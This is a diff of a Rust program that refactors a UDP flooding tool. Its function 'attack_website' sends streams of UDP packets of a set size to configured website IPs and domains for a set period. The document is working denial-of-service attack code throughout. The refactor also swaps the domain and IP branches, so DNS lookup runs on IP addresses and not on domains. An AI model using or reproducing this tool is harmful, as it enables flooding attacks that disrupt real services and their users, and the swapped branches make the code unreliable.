@@ -7,7 +7,7 @@ use std::{
     fmt::{Debug, Display, Formatter},
     fs::File,
     io::{BufRead, BufReader},
-    net::{IpAddr, SocketAddr, UdpSocket},
+    net::{SocketAddr, UdpSocket},
     thread::sleep,
     time::{Duration, Instant},
 };
@@ -108,41 +108,25 @@ async fn load_config() -> Result<Config> {
 
 // ----- Website Configuration START -----
 #[derive(Clone)]
-enum WebsiteConfig {
-    Ip { ip: String, ports: Vec<String> },
-    Domain { link: String, ports: Vec<String> },
+struct WebsiteConfig {
+    pub address: String,
+    pub ports: Vec<String>,
+    pub is_domain: bool,
 }
 
 impl Debug for WebsiteConfig {
     fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
-        match self {
-            WebsiteConfig::Ip { ip, ports } => write!(
-                f,
-                "{}",
-                format!(
-                    "[{}]",
-                    ports
-                        .iter()
-                        .map(|port| format!("{}:{}", ip, port))
-                        .collect::<Vec<_>>()
-                        .join(", ")
-                        .to_string()
-                )
-            ),
-            WebsiteConfig::Domain { link, ports } => write!(
-                f,
-                "{}",
-                format!(
-                    "[{}]",
-                    ports
-                        .iter()
-                        .map(|port| format!("{} : {}", link, port))
-                        .collect::<Vec<_>>()
-                        .join(", ")
-                        .to_string()
-                )
-            ),
-        }
+        let spacing = if self.is_domain { " " } else { "" };
+
+        write!(
+            f,
+            "[{}]",
+            self.ports
+                .iter()
+                .map(|port| format!("{}{}:{}{}", self.address, spacing, spacing, port))
+                .collect::<Vec<_>>()
+                .join(", ")
+        )
     }
 }
 
@@ -161,52 +145,37 @@ fn load_websites_configs(config: &Config) -> Result<Vec<WebsiteConfig>> {
         let mut split = website.split(' ');
 
         if let Some(first) = split.next() {
-            match first {
-                "ip" => {
-                    if let Some(ip) = split.next() {
-                        let mut ports = vec![];
+            let is_domain = match first {
+                "ip" => false,
+                "domain" => true,
+                _ => false,
+            };
 
-                        while let Some(port) = split.next() {
-                            ports.push(port.to_string());
-                        }
+            if let Some(address) = split.next() {
+                let mut ports = vec![];
 
-                        if ports.len() == 0 {
-                            ports = config.default_ports.clone();
-                        }
-
-                        for port in ports.iter() {
-                            info!("Found ip {} with port {}", ip, port);
-                        }
-
-                        configs.push(WebsiteConfig::Ip {
-                            ip: ip.to_string(),
-                            ports,
-                        })
-                    }
+                while let Some(port) = split.next() {
+                    ports.push(port.to_string());
                 }
-                "domain" => {
-                    if let Some(domain) = split.next() {
-                        let mut ports = vec![];
 
-                        while let Some(port) = split.next() {
-                            ports.push(port.to_string());
-                        }
-
-                        if ports.len() == 0 {
-                            ports = config.default_ports.clone();
-                        }
-
-                        for port in ports.iter() {
-                            info!("Found domain {} with port {}", domain, port);
-                        }
-
-                        configs.push(WebsiteConfig::Domain {
-                            link: domain.to_string(),
-                            ports,
-                        });
-                    }
+                if ports.len() == 0 {
+                    ports = config.default_ports.clone();
                 }
-                _ => {}
+
+                for port in ports.iter() {
+                    info!(
+                        "Found {} {} with port {}",
+                        if is_domain { "domain" } else { "ip" },
+                        address,
+                        port
+                    );
+                }
+
+                configs.push(WebsiteConfig {
+                    address: address.to_string(),
+                    ports,
+                    is_domain,
+                })
             }
         }
     }
@@ -245,141 +214,84 @@ async fn attack_website(start: Instant, config: Config, website_config: WebsiteC
 
     let packet_size = config.packet_size;
 
-    match website_config {
-        WebsiteConfig::Ip { ip, ports } => {
-            let tasks = ports
-                .iter()
-                .map(|port| {
-                    let ip = ip.clone();
-                    let port = port.clone();
+    let mut socket_addresses = vec![];
 
-                    tokio::spawn(async move {
-                        let sender: SocketAddr = format!(
-                            "0.0.0.0:{}",
-                            pick_unused_port().expect("No free port found!")
-                        )
-                        .parse()
-                        .expect("Couldn't get sender IP address");
-
-                        let socket = UdpSocket::bind(sender)
-                            .expect(&format!("Couldn't bind socket to {}", sender));
-                        let ip_address: IpAddr = ip
-                            .parse()
-                            .expect(&format!("Couldn't parse ip address {}", ip));
-                        let port: u16 = port
-                            .parse()
-                            .expect(&format!("Couldn't parse port {}", port));
-
-                        info!("Creating socket...");
-                        let socket_address = &format!("{}:{}", ip_address, port);
-
-                        match socket.connect(socket_address) {
-                            std::result::Result::Ok(_) => {
-                                let buffer = generate_buffer(packet_size);
-
-                                while start.elapsed().as_secs() < config.execution_time {
-                                    let res = socket.send(buffer.as_slice());
-                                    match res {
-                                        std::result::Result::Ok(size) => {
-                                            info!(
-                                                "Successfully sent a packet of size {} to {}",
-                                                size, socket_address
-                                            );
-                                        }
-                                        std::result::Result::Err(error) => {
-                                            error!(
-                                                "Failed to send a packet to {}.\nError message: {}",
-                                                socket_address, error
-                                            );
-                                        }
-                                    }
-
-                                    sleep(config.timeout);
-                                }
-                            }
-                            Err(error) => {
-                                error!(
-                                    "Couldn't connect to {}.\nError message: {}",
-                                    socket_address, error
-                                );
-                            }
-                        }
-                    })
-                })
-                .collect::<Vec<_>>();
-
-            futures::future::join_all(tasks).await;
+    if website_config.is_domain {
+        for port in website_config.ports.iter() {
+            socket_addresses.push(format!("{}:{}", website_config.address, port));
         }
-        WebsiteConfig::Domain { link, ports } => {
-            if let std::result::Result::Ok(ips) = lookup_host(&link) {
-                let mut socket_addresses = vec![];
-
-                for ip in ips.iter() {
-                    for port in ports.iter() {
-                        socket_addresses.push(format!("{}:{}", ip, port));
-                    }
+    } else {
+        if let std::result::Result::Ok(ips) = lookup_host(&website_config.address) {
+            for ip in ips.iter() {
+                for port in website_config.ports.iter() {
+                    socket_addresses.push(format!("{}:{}", ip, port));
                 }
+            }
+        } else {
+            error!(
+                "Couldn't find ips for the domain {}",
+                website_config.address
+            );
 
-                let tasks = socket_addresses
-                    .iter()
-                    .map(|socket_address| {
-                        let socket_address = socket_address.clone();
+            return;
+        }
+    }
 
-                        tokio::spawn(async move {
-                            info!("Creating socket...");
+    let tasks = socket_addresses
+        .iter()
+        .map(|socket_address| {
+            let socket_address = socket_address.clone();
 
-                            let sender: SocketAddr = format!(
-                                "0.0.0.0:{}",
-                                pick_unused_port().expect("No free port found!")
-                            )
-                            .parse()
-                            .expect("Couldn't get sender IP address");
+            tokio::spawn(async move {
+                let sender: SocketAddr = format!(
+                    "0.0.0.0:{}",
+                    pick_unused_port().expect("No free port found!")
+                )
+                .parse()
+                .expect("Couldn't get sender IP address");
 
-                            let socket = UdpSocket::bind(sender)
-                                .expect(&format!("Couldn't bind socket to {}", sender));
+                info!("Creating socket for {} ...", sender);
 
-                            match socket.connect(socket_address.clone()) {
-                                std::result::Result::Ok(_) => {
-                                    let buffer = generate_buffer(packet_size);
+                let socket =
+                    UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));
 
-                                    while start.elapsed().as_secs() < config.execution_time {
-                                        let res = socket.send(buffer.as_slice());
+                match socket.connect(socket_address.clone()) {
+                    std::result::Result::Ok(_) => {
+                        let buffer = generate_buffer(packet_size);
 
-                                        match res {
-                                            std::result::Result::Ok(size) => {
-                                                info!(
-                                                    "Successfully sent a packet of size {} to {}",
-                                                    size, socket_address
-                                                );
-                                            }
-                                            std::result::Result::Err(error) => {
-                                                error!(
-                                            "Failed to send a packet to {} .\nError message: {}",
-                                            socket_address, error
-                                        );
-                                            }
-                                        }
+                        while start.elapsed().as_secs() < config.execution_time {
+                            let res = socket.send(buffer.as_slice());
 
-                                        sleep(config.timeout);
-                                    }
+                            match res {
+                                std::result::Result::Ok(size) => {
+                                    info!(
+                                        "Successfully sent a packet of size {} to {}",
+                                        size, socket_address
+                                    );
                                 }
-                                Err(error) => {
+                                std::result::Result::Err(error) => {
                                     error!(
-                                        "Couldn't connect to {}.\nError message: {}",
+                                        "Failed to send a packet to {} .\nError message: {}",
                                         socket_address, error
                                     );
                                 }
                             }
-                        })
-                    })
-                    .collect::<Vec<_>>();
 
-                futures::future::join_all(tasks).await;
-            } else {
-                error!("Couldn't find ips for the domain!");
-            }
-        }
-    }
+                            sleep(config.timeout);
+                        }
+                    }
+                    std::result::Result::Err(error) => {
+                        error!(
+                            "Couldn't connect to {}.\nError message: {}",
+                            socket_address, error
+                        );
+                    }
+                }
+            })
+        })
+        .collect::<Vec<_>>();
+
+    futures::future::join_all(tasks).await;
 }
 
 fn generate_buffer(size: usize) -> Vec<u8> {
